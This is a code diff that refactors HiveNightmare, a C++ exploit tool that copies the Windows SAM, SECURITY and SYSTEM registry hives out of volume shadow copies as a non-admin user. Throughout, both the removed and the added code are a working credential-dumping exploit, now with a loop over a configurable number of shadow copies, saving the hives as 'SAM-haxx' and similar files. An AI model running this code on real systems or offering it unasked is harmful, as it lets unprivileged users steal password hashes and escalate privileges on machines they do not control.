@@ -16,177 +16,105 @@
 using std::endl;
 using std::cout;
 
-void main()
-{
-    printf("\nHiveNightmare - dump registry hives as non-admin users\n\nRunning...\n\n");
+HANDLE getVssFileHandle(TCHAR* path, int maxSearch) {
+    HANDLE hfile;
+    wchar_t base[] = L"\\\\?\\GLOBALROOT\\Device\\HarddiskVolumeShadowCopy";
 
-    HANDLE hFile;
+    for (int i = 1; i <= maxSearch; i++) {
+        wchar_t fullPath[MAX_PATH];
+        swprintf_s(fullPath, MAX_PATH, L"%s%d\\%s", base, i, path);
+
+        hfile = CreateFile(fullPath, GENERIC_READ, 0, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
+        if (hfile != INVALID_HANDLE_VALUE) {
+            return hfile;
+        }
+
+    }
+
+    return INVALID_HANDLE_VALUE;
+}
+
+void dumpHandleToFile(HANDLE handle, wchar_t* dest) {
     HANDLE hAppend;
     DWORD  dwBytesRead, dwBytesWritten, dwPos;
     BYTE   buff[4096];
-
-    // Check out this mess, looks for VSC #1, #2, #3, #4 only.  Lolz.
-
-    hFile = CreateFile(TEXT("\\\\?\\GLOBALROOT\\Device\\HarddiskVolumeShadowCopy1\\Windows\\System32\\config\\SAM"),GENERIC_READ, 0, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL); 
-
-    if (hFile == INVALID_HANDLE_VALUE)
-    {
-        hFile = CreateFile(TEXT("\\\\?\\GLOBALROOT\\Device\\HarddiskVolumeShadowCopy2\\Windows\\System32\\config\\SAM"), GENERIC_READ, 0, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
-
-        if (hFile == INVALID_HANDLE_VALUE)
-        {
-            hFile = CreateFile(TEXT("\\\\?\\GLOBALROOT\\Device\\HarddiskVolumeShadowCopy3\\Windows\\System32\\config\\SAM"), GENERIC_READ, 0, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
-
-            if (hFile == INVALID_HANDLE_VALUE)
-            {
-                hFile = CreateFile(TEXT("\\\\?\\GLOBALROOT\\Device\\HarddiskVolumeShadowCopy4\\Windows\\System32\\config\\SAM"), GENERIC_READ, 0, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
-
-                if (hFile == INVALID_HANDLE_VALUE)
-                {
-                    printf("Could not open SAM :( Is System Protection not enabled or vulnerability fixed?  Note currently hardcoded to look for first 4 VSS snapshots only - list snapshots with vssadmin list shadows\n");
-                }
-            }
-        }
-    }
-
-
-    hAppend = CreateFile(TEXT("SAM-haxx"), FILE_APPEND_DATA, FILE_SHARE_READ, NULL, OPEN_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL); 
+    hAppend = CreateFile(dest, FILE_APPEND_DATA, FILE_SHARE_READ, NULL, OPEN_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
 
     if (hAppend == INVALID_HANDLE_VALUE)
     {
-        printf("Could not write SAM-haxx - permission issue rather than vulnerability issue, make sure you're running from a folder where you can write to\n");
+        printf("Could not write %ls - permission issue rather than vulnerability issue, make sure you're running from a folder where you can write to\n", dest);
         return;
     }
 
-    // Append the SAM file to the end of the second file.
-    // We should probably overwrite it really.
+    while (ReadFile(handle, buff, sizeof(buff), &dwBytesRead, NULL)
+        && dwBytesRead > 0)
+    {
+        dwPos = SetFilePointer(hAppend, 0, NULL, FILE_END);
+        LockFile(hAppend, dwPos, 0, dwBytesRead, 0);
+        WriteFile(hAppend, buff, dwBytesRead, &dwBytesWritten, NULL);
+        UnlockFile(hAppend, dwPos, 0, dwBytesRead, 0);
+    }
+
+    CloseHandle(hAppend);
+}
+
+int main(int argc, char* argv[])
+{
+    int searchDepth;
+    if (argc > 1) {
+        if (sscanf_s(argv[1], "%d", &searchDepth) != 1) {
+            printf("\nUsage: HiveNightmare.exe [max shadows to look at (default 4)]\n\n");
+            return -1;
+        }
+    }
+    else {
+        searchDepth = 4;
+    }
+
+    printf("\nHiveNightmare - dump registry hives as non-admin users\n\nRunning...\n\n");
+
+    HANDLE hFile;
+
+    TCHAR samLocation[] = L"Windows\\System32\\config\\SAM";
+    TCHAR securityLocation[] = L"Windows\\System32\\config\\SECURITY";
+    TCHAR systemLocation[] = L"Windows\\System32\\config\\SYSTEM";
+
+    hFile = getVssFileHandle(samLocation, searchDepth);
+    if (hFile == INVALID_HANDLE_VALUE) {
+        printf("Could not open SAM :( Is System Protection not enabled or vulnerability fixed?  Try increasing the number of VSS snapshots to search - list snapshots with vssadmin list shadows\n");
+        return -1;
+    }
+    else {
+        dumpHandleToFile(hFile, (wchar_t*)L"SAM-haxx");
+        CloseHandle(hFile);
+        cout << "SAM hive written out to current working directory" << endl;
+    }
     
 
-    while (ReadFile(hFile, buff, sizeof(buff), &dwBytesRead, NULL)
-        && dwBytesRead > 0)
-    {
-        dwPos = SetFilePointer(hAppend, 0, NULL, FILE_END);
-        LockFile(hAppend, dwPos, 0, dwBytesRead, 0);
-        WriteFile(hAppend, buff, dwBytesRead, &dwBytesWritten, NULL);
-        UnlockFile(hAppend, dwPos, 0, dwBytesRead, 0);
+    hFile = getVssFileHandle(securityLocation, searchDepth);
+    if (hFile == INVALID_HANDLE_VALUE) {
+        printf("Could not open SECURITY :( Is System Protection not enabled or vulnerability fixed?  Try increasing the number of VSS snapshots to search - list snapshots with vssadmin list shadows\n");
+        return -1;
     }
-
-    // Safety first.
-
-    CloseHandle(hFile);
-    CloseHandle(hAppend);
-
-    cout << "SAM hive written out to current working directory" << endl;
-
-    ///////////////////////////////////////////////
-    // UPDATE PART 1: READ IN THE SECURITY HIVE TOO
-    ///////////////////////////////////////////////
-    hFile = CreateFile(TEXT("\\\\?\\GLOBALROOT\\Device\\HarddiskVolumeShadowCopy1\\Windows\\System32\\config\\SECURITY"), GENERIC_READ, 0, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
-
-    if (hFile == INVALID_HANDLE_VALUE)
-    {
-        hFile = CreateFile(TEXT("\\\\?\\GLOBALROOT\\Device\\HarddiskVolumeShadowCopy2\\Windows\\System32\\config\\SECURITY"), GENERIC_READ, 0, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
-
-        if (hFile == INVALID_HANDLE_VALUE)
-        {
-            hFile = CreateFile(TEXT("\\\\?\\GLOBALROOT\\Device\\HarddiskVolumeShadowCopy3\\Windows\\System32\\config\\SECURITY"), GENERIC_READ, 0, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
-
-            if (hFile == INVALID_HANDLE_VALUE)
-            {
-                hFile = CreateFile(TEXT("\\\\?\\GLOBALROOT\\Device\\HarddiskVolumeShadowCopy4\\Windows\\System32\\config\\SECURITY"), GENERIC_READ, 0, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
-
-                if (hFile == INVALID_HANDLE_VALUE)
-                {
-                    printf("Could not open SECURITY :( Is System Protection not enabled or vulnerability fixed?  Note currently hardcoded to look for first 4 VSS snapshots only - list snapshots with vssadmin list shadows\n");
-                    
-                }
-            }
-        }
+    else {
+        dumpHandleToFile(hFile, (wchar_t*)L"SECURITY-haxx");
+        CloseHandle(hFile);
+        cout << "SECURITY hive written out to current working directory" << endl;
     }
+    
 
-
-    hAppend = CreateFile(TEXT("SECURITY-haxx"), FILE_APPEND_DATA, FILE_SHARE_READ, NULL, OPEN_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
-
-    if (hAppend == INVALID_HANDLE_VALUE)
-    {
-        printf("Could not write SECURITY-haxx - permission issue rather than vulnerability issue, make sure you're running from a folder where you can write to");
-        return;
+    hFile = getVssFileHandle(systemLocation, searchDepth);
+    if (hFile == INVALID_HANDLE_VALUE) {
+        printf("Could not open SYSTEM :( Is System Protection not enabled or vulnerability fixed?  Try increasing the number of VSS snapshots to search - list snapshots with vssadmin list shadows\n");
+        return -1;
     }
-
-    // Append the SECURITY file to the end of the second file.
-    // We should probably overwrite it really.
-
-
-    while (ReadFile(hFile, buff, sizeof(buff), &dwBytesRead, NULL)
-        && dwBytesRead > 0)
-    {
-        dwPos = SetFilePointer(hAppend, 0, NULL, FILE_END);
-        LockFile(hAppend, dwPos, 0, dwBytesRead, 0);
-        WriteFile(hAppend, buff, dwBytesRead, &dwBytesWritten, NULL);
-        UnlockFile(hAppend, dwPos, 0, dwBytesRead, 0);
+    else {
+        dumpHandleToFile(hFile, (wchar_t*)L"SYSTEM-haxx");
+        CloseHandle(hFile);
+        cout << "SYSTEM hive written out to current working directory" << endl;
     }
-
-    // Safety first.
-
-    CloseHandle(hFile);
-    CloseHandle(hAppend);
-
-    cout << "SECURITY hive written out to current working directory" << endl;
-
-    ///////////////////////////////////////////////
-    // UPDATE PART 1: READ IN THE SYSTEM HIVE TOO
-    ///////////////////////////////////////////////
-    hFile = CreateFile(TEXT("\\\\?\\GLOBALROOT\\Device\\HarddiskVolumeShadowCopy1\\Windows\\System32\\config\\SYSTEM"), GENERIC_READ, 0, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
-
-    if (hFile == INVALID_HANDLE_VALUE)
-    {
-        hFile = CreateFile(TEXT("\\\\?\\GLOBALROOT\\Device\\HarddiskVolumeShadowCopy2\\Windows\\System32\\config\\SYSTEM"), GENERIC_READ, 0, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
-
-        if (hFile == INVALID_HANDLE_VALUE)
-        {
-            hFile = CreateFile(TEXT("\\\\?\\GLOBALROOT\\Device\\HarddiskVolumeShadowCopy3\\Windows\\System32\\config\\SYSTEM"), GENERIC_READ, 0, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
-
-            if (hFile == INVALID_HANDLE_VALUE)
-            {
-                hFile = CreateFile(TEXT("\\\\?\\GLOBALROOT\\Device\\HarddiskVolumeShadowCopy4\\Windows\\System32\\config\\SYSTEM"), GENERIC_READ, 0, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
-
-                if (hFile == INVALID_HANDLE_VALUE)
-                {
-                    printf("Could not open SYSTEM :( Is System Protection not enabled or vulnerability fixed?  Note currently hardcoded to look for first 4 VSS snapshots only - list snapshots with vssadmin list shadows\n");
-
-                }
-            }
-        }
-    }
-
-
-    hAppend = CreateFile(TEXT("SYSTEM-haxx"), FILE_APPEND_DATA, FILE_SHARE_READ, NULL, OPEN_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
-
-    if (hAppend == INVALID_HANDLE_VALUE)
-    {
-        printf("Could not write SYSTEM-haxx - permission issue rather than vulnerability issue, make sure you're running from a folder where you can write to\n");
-        return;
-    }
-
-    // Append the SECURITY file to the end of the second file.
-    // We should probably overwrite it really.
-
-
-    while (ReadFile(hFile, buff, sizeof(buff), &dwBytesRead, NULL)
-        && dwBytesRead > 0)
-    {
-        dwPos = SetFilePointer(hAppend, 0, NULL, FILE_END);
-        LockFile(hAppend, dwPos, 0, dwBytesRead, 0);
-        WriteFile(hAppend, buff, dwBytesRead, &dwBytesWritten, NULL);
-        UnlockFile(hAppend, dwPos, 0, dwBytesRead, 0);
-    }
-
-    // Safety first.
-
-    CloseHandle(hFile);
-    CloseHandle(hAppend);
-
-    cout << "SYSTEM hive written out to current working directory" << endl;
 
     cout << "Assuming no errors, should be able to find hive dump files in current working directory as SAM-haxx, SECURITY-haxx and SYSTEM-haxx" << endl;
+
+    return 0;
 }
